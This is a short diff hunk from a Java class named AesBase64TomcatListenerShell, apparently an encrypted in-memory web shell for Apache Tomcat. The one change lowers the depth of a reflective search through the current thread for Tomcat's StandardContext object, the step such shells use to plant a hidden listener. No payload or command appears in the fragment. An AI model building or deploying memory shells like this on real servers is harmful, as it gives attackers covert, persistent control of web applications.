@@ -94,7 +94,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         blackType.add(Boolean.class.getName());
         blackType.add(String.class.getName());
 
-        Object obj = searchObject("org.apache.catalina.core.StandardContext",Thread.currentThread(),new HashSet(),blackType,30,0);
+        Object obj = searchObject("org.apache.catalina.core.StandardContext",Thread.currentThread(),new HashSet(),blackType,10,0);
         if (obj != null) {
             contexts.add(obj);
             try {
